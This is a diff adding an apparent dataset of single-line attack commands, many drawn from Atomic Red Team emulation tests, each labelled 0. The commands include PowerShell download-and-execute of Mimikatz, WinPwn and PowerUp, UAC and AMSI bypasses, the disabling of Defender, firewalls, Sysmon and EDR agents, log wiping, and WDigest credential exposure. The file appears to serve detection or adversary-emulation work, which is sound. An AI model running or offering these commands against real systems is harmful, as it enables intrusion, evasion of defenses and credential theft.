@@ -1,0 +1,281 @@
+0	Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
+0	$orgValue =(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin;Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
+0	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');inv-phantom -consoleoutput -noninteractive  
+0	reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+0	cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
+0	import-module "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1";try { Invoke-BloodHound -OutputDirectory $env:Temp };catch { $_; exit $_.Exception.HResult};Start-Sleep 5
+0	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique DiskCleanup
+0	"#{Path_to_file}" 1>NUL 
+0	IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f );IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f );IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f );IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f )
+0	reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f;reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f
+0	wscript.exe "#{vbscript_file}"
+0	$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
+0	set +o history
+0	service syslogd stop&&sysrc syslogd_enable="NO"
+0	driverquery /v;driverquery /si
+0	reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+0	net view /domain;net view
+0	sudo find /var/log -name '#{system_log_name1}.*' -exec rm {} \; #using "rm" execution&&sudo find /var/log/ -name "#{system_log_name2}.*" -exec shred -u -z -n 3 {} \; #using "shred" execution&&sudo find /var/log/ -name "#{system_log_name3}.*" -exec unlink {} \; #using "unlink" execution
+0	ufw prepend deny from 1.2.3.4&&ufw status numbered
+0	$malcmdlets = #{Malicious_cmdlets};foreach ($cmdlets in $malcmdlets) {;    "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"};foreach ($cmdlets in $malcmdlets) {;    $cmdlets}
+0	Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop
+0	netstat -r | grep default
+0	reg add HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f;reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
+0	net user administrator /domain
+0	New-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name DisableCMD -Value 1
+0	reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f
+0	[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+0	net group "Domain Computers" /domain
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t REG_DWORD /d 1 /f
+0	del %TEMP%\redcanary.cab >nul 2>&1;#{Path_replace} #{replace_cab} %TEMP% /A
+0	reg add "hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
+0	ip tcp_metrics show |grep --invert-match "^127\."
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
+0	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v MicrosoftRedirectionURL /t REG_SZ /d "#{redirection_url}" /f
+0	([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()
+0	mkdir "\\?\C:\Windows \System32\";copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe";mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+0	"#{file_path}"
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /t REG_DWORD /d 1 /f
+0	$key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\";$name ="bad-subdomain";new-item $key -Name $name -Force;new-itemproperty $key$name -Name https -Value 2 -Type DWORD;;new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;;new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
+0	REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode" /VE /T REG_SZ /F /D "Service"
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetTaskbar /t REG_DWORD /d 1 /f
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
+0	Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop
+0	$excludedProcess = "#{excluded_process}";Add-MpPreference -ExclusionProcess $excludedProcess
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f
+0	free && echo 3 > /proc/sys/vm/drop_caches && free&&echo 3> /proc/sys/vm/drop_caches 
+0	ip route show
+0	Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
+0	sudo unlink #{system_log_path}
+0	fltmc.exe unload #{sysmon_driver}
+0	REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
+0	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
+0	$target = $env:LOGONSERVER;$target = $target.Trim("\\");$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString;wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\"Event[System[(EventID=4776)]]"'
+0	rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
+0	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');oldchecks -noninteractive -consoleoutput
+0	"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties
+0	sudo log erase --all&&sudo log erase --ttl #Deletes only time-to-live log content
+0	$imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe";& $imewdbled #{remote_url}
+0	sysmon -u
+0	uname -a >> #{output_file}&&if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi&&if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   &&if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi&&if [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi&&uptime >> #{output_file}&&cat #{output_file} 2>/dev/null
+0	reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f
+0	New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force;New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force;Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force;Start-Process "C:\Windows\System32\fodhelper.exe"
+0	history -c
+0	New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force;New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force;New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force
+0	"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=person) #{optional_args}
+0	sudo shred -u -z -n 3 #{system_log_path}
+0	net.exe stop #{service_name};sc.exe config #{service_name} start= disabled
+0	kldstat | grep -i "vmm"&&kldstat | grep -i "vbox"
+0	iptables-save > /tmp/iptables.rules&&iptables -D OUTPUT -p tcp --dport 21 -j DROP
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAVolume /t REG_DWORD /d 1 /f
+0	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing);Invoke-AllChecks
+0	reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
+0	write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan;IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');;Invoke-BloodHound -OutputDirectory $env:Temp;Start-Sleep 5
+0	ip neighbour show
+0	detectorId=$(aws guardduty create-detector --enable --region "#{region}" | grep -oP '(?<="DetectorId": ")[^"]*')&&aws guardduty update-detector --no-enable --detector-id $detectorId&&aws guardduty delete-detector --detector-id $detectorId
+0	query user /SERVER:#{computer_name}
+0	"#{uacme_exe}"
+0	Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+0	reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
+0	sudo systemctl stop falcon-sensor.service&&sudo systemctl disable falcon-sensor.service
+0	"#{uacme_exe}"
+0	sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
+0	csrutil status
+0	(New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}")
+0	"#{uacme_exe}"
+0	echo '' > /var/log/messages
+0	Set-MpPreference -DisableRealtimeMonitoring 1;Set-MpPreference -DisableBehaviorMonitoring 1;Set-MpPreference -DisableScriptScanning 1;Set-MpPreference -DisableBlockAtFirstSeen 1
+0	reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Enabled" /t REG_DWORD /d 0 /f
+0	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1');Invoke-SharpUp -command "audit"
+0	lsmod&&kmod list&&grep vmw /proc/modules
+0	Get-ADComputer #{hostname} -Properties *
+0	wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
+0	kldstat&&kldstat | grep vmm
+0	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d "#{redirection_program}" /f
+0	$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force;$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd;Connect-ExchangeOnline -Credential $creds;$test = Get-AntiPhishRule;Disable-AntiPhishRule -Identity $test.Name -Confirm:$false;Get-AntiPhishRule
+0	arp -a | grep -v '^?'
+0	setenforce 0
+0	reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+0	netsh advfirewall firewall add rule name="Open Port to Any" dir=in protocol=tcp localport=#{local_port} action=allow profile=any
+0	Set-MpPreference -drtm $True;Set-MpPreference -dbm $True;Set-MpPreference -dscrptsc $True;Set-MpPreference -dbaf $True
+0	reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_DWORD /d 1 /f;reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d Administrator /f;reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName /t REG_SZ /d contoso.com /f;reg add "HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d password1 /f
+0	$typicalPath = "HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds"; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name "AtomicSnake" -Value $randomBytes -PropertyType Binary -Force | Out-Null
+0	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f
+0	ufw disable
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f
+0	(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}
+0	"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -sc exchaddresses #{optional_args}
+0	osascript -e 'tell application "Finder" to delete POSIX file "#{system_log_path}"'
+0	cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*";MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}
+0	wmic cpu get name;wmic MEMPHYSICAL get MaxCapacity;wmic baseboard get product;wmic baseboard get version;wmic bios get SMBIOSBIOSVersion;wmic path win32_VideoController get name;wmic path win32_VideoController get DriverVersion;wmic path win32_VideoController get VideoModeDescription;wmic OS get Caption,OSArchitecture,Version;wmic DISKDRIVE get Caption;Get-WmiObject win32_bios
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d 2 /f
+0	reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f
+0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f;cmd.exe /c eventvwr.msc
+0	"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -sc admincountdmp #{optional_args}
+0	copy C:\Windows\System32\cmd.exe C:\svchost.exe;C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
+0	powershell.exe -e  #{obfuscated_code}
+0	Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}
+0	$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)";New-Item -Path $datePath -ItemType Directory;Set-Location $datePath;certutil -verifyctl -split -f #{remote_file};Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
+0	C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAHealth /t REG_DWORD /d 1 /f
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f;reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 1 /f
+0	ufw logging off
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAPower /t REG_DWORD /d 1 /f
+0	if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];&&then&&  service cbdaemon stop&&  chkconfig off cbdaemon&&else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];&&  systemctl stop cbdaemon&&  systemctl disable cbdaemon&&fi
+0	netsh advfirewall firewall add rule name="atomic testing" action=allow dir=in protocol=TCP localport=450 
+0	C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
+0	net user /domain;get-localgroupmember -group Users;get-aduser -filter *
+0	sc stop WinDefend;sc config WinDefend start=disabled;sc query WinDefend
+0	$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1];$pieces = $localip.split(".");$firstOctet = $pieces[0];$secondOctet = $pieces[1];$thirdOctet = $pieces[2];foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /t REG_DWORD /d 1 /f
+0	unlink /var/log/messages
+0	sudo launchctl unload #{falcond_plist}&&sudo launchctl unload #{userdaemon_plist}
+0	set
+0	echo "# THIS IS A COMMENT" >> /etc/default/ufw&&grep "# THIS IS A COMMENT" /etc/default/ufw
+0	swapon -a &&sleep 2&&swapoff -a&&sync
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f
+0	env
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /t REG_DWORD /d 0 /f;reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
+0	"#{uacme_exe}"
+0	"#{uacme_exe}"
+0	Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Gui" -NoRestart -ErrorAction Ignore;Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Features" -NoRestart -ErrorAction Ignore;Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender" -NoRestart -ErrorAction Ignore;Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-ApplicationGuard" -NoRestart -ErrorAction Ignore
+0	sudo echo '' > #{system_log_path}
+0	New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel";New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security";New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView";New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value "1" -PropertyType "Dword";New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword";New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword";New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"
+0	reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f;reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoRebootWithLoggedOnUsers" /t REG_DWORD /d 1 /f
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
+0	systeminfo;reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
+0	Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore
+0	REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
+0	New-Item #{commandpath} -Force | Out-Null;New-ItemProperty -Path #{commandpath} -Name "DelegateExecute" -Value "" -Force | Out-Null;Set-ItemProperty -Path #{commandpath} -Name "(default)" -Value "#{commandtorun}" -Force -ErrorAction SilentlyContinue | Out-Null;$Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
+0	arp -a
+0	$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)");$DirectorySearcher.PropertiesToLoad.Add("Name");$Computers = $DirectorySearcher.findall();foreach ($Computer in $Computers) {;  $Computer = $Computer.Properties.name;  if (!$Computer) { Continue };  Write-Host $Computer}
+0	#{flavor_command}
+0	Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+0	Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop
+0	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
+0	(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] OU Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
+0	reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f
+0	& "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -h #{domain} -s subtree -f "objectclass=computer" *
+0	hostname
+0	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileMenu /t REG_DWORD /d 1 /f
+0	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');generaldomaininfo -noninteractive -consoleoutput
+0	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');itm4nprivesc -noninteractive -consoleoutput
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor" /v "AllowSecondaryAuthenticationDevice" /t REG_DWORD /d 0 /f
+0	echo "block in proto tcp from 1.2.3.4 to any" | pfctl -a pf-rules -f -&&pfctl -a pf-rules -s rules
+0	net user /domain;net group /domain
+0	New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force;Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force;Start-Process "C:\Windows\System32\eventvwr.msc"
+0	del %TEMP%\redcanary.cab >nul 2>&1;#{Path_replace} "#{replace_cab}" %TEMP% /A
+0	New-PSSession -ComputerName #{hostname_to_connect};Test-Connection $env:COMPUTERNAME;Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use";Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use;Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
+0	netsh advfirewall firewall set rule group="remote desktop" new enable=Yes;netsh advfirewall firewall set rule group="file and printer sharing" new enable=Yes
+0	# Set the registry values for http and https to 0;Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'http' -Value 0;Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'https' -Value 0
+0	Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{};if(#{delete_defender_folder}){;  $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse;  Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{};}
+0	reg add HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f
+0	certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}
+0	sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
+0	pushd #{destination_path};echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js;CScript.exe AtomicTestT1105.js //E:JScript;del AtomicTestT1105.js /Q >nul 2>&1;del AtomicTestFileT1105.js /Q >nul 2>&1;popd
+0	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f
+0	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1');Invoke-watson
